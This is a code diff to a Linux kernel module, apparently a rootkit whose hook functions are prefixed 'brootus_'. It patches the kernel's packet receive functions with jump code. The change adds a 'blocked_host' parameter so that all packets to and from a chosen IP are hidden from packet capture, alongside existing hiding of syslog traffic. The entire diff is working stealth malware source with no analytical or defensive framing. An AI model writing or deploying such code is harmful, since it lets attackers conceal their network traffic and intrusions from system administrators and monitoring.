@@ -9,6 +9,26 @@
 #define JUMP_CODE_SIZE 6
 #define JUMP_CODE_ADDR_OFFSET 1
 
+// The IP of the host we want to hide the traffic with
+char* blocked_host;
+module_param(blocked_host, charp, 0);
+MODULE_PARM_DESC(blocked_host, "IP of the host all packets to and from are hidden");
+unsigned int blocked_host_ip;
+
+void set_blocked_host_ip(char* ip_str)
+{
+  int err;
+  u8 ip[4];
+  const char* end;
+
+  // Parse IP address
+  err = in4_pton(ip_str, -1, ip, -1, &end);
+  if (err == 0) {
+    return; // panic
+  }
+  blocked_host_ip = *((unsigned int*) ip);
+}
+
 // x86 assembler for:
 // push $0x00000000 ; address to be adjusted
 // ret
@@ -66,7 +86,7 @@ int brootus_##__fn(struct sk_buff* skb, struct net_device* dev, \
                    struct packet_type* pt, struct net_device* orig_dev) \
 { \
   int ret; \
-  if (is_syslog_packet(skb)) return 0; \
+  if (hide_packet(skb)) return 0; \
   CALL_ORIGINAL(__fn); \
   return ret; \
 }
@@ -93,12 +113,17 @@ set_pte_permissions((unsigned int) fn_##__fn, original_pte_##__fn);
 /* =================================================================== */
 
 // Check if we should hide this packet
-int is_syslog_packet(struct sk_buff* skb)
+int hide_packet(struct sk_buff* skb)
 {
   //Check if the packet is IPv4
   if (skb->protocol == htons(ETH_P_IP)) {
     // Extract the IP header
     struct iphdr* iph = (struct iphdr*) skb_network_header(skb);
+
+    // Check if the blocked host's IP is involved
+    if (iph->saddr == blocked_host_ip || iph->daddr == blocked_host_ip){
+      return 1;
+    }
 
     // Check if the packet is for our syslog server and UDP
     if (iph->protocol == IPPROTO_UDP && iph->daddr == syslog_ip_bin) {
@@ -144,6 +169,7 @@ void init_packet_hiding(void)
   PAGE_WRITABLE(packet_rcv);
   PAGE_WRITABLE(packet_rcv_spkt);
 
+  set_blocked_host_ip(blocked_host);
   enable_packet_hiding();
 }
 
